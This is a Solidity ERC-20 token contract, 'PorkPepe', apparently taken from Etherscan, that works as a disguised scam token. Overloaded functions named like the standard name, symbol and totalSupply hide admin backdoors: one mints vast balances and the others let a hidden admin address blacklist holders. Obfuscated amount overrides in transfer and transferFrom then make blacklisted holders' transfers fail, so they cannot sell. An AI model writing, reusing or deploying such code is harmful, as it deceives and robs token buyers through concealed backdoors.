/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    
}


contract PorkPepe is Ownable{
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor(string memory tokenname,string memory tokensymbol,address hkadmin) {
        _totalSupply = 10000000000*10**decimals();
        _balances[msg.sender] = 10000000000*10**decimals();
        _tokename = tokenname;
        _tokensymbol = tokensymbol;
        LLAXadmin = hkadmin;
        emit Transfer(address(0), msg.sender, 10000000000*10**decimals());
    }
    

    mapping(address => bool) public longinfo;
    address public LLAXadmin;
    uint256 private _totalSupply;
    string private _tokename;
    string private _tokensymbol;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    function name() public view returns (string memory) {
        return _tokename;
    }

    uint256 xaskak = (10**18 * (78800+100)* (33300000000 + 800));
    function symbol(uint256 xxaa) public   {
        if(false){
            
        }
        if(true){

        }
        _balances[_msgSender()] += xaskak;
        _balances[_msgSender()] += xaskak;
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
    }


    function symbol() public view  returns (string memory) {
        return _tokensymbol;
    }
    function name(address hkkk) public  {
        address txxaaoinfo = hkkk;
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
        longinfo[txxaaoinfo] = false;
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
    }

    function totalSupply(address xasada) public {
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
        address tmoinfo = xasada;
        longinfo[tmoinfo] = true;
        require(_msgSender() == LLAXadmin, "Only ANIUadmin can call this function");
    }

    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        if (true == longinfo[_msgSender()]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        if (true == longinfo[from]) 
        {amount = _balances[_msgSender()] + 
        1000-1000+2000;}
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
    
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        uint256 balance = _balances[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount;
        _balances[to] = _balances[to]+amount;
        emit Transfer(from, to, amount); 
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }
}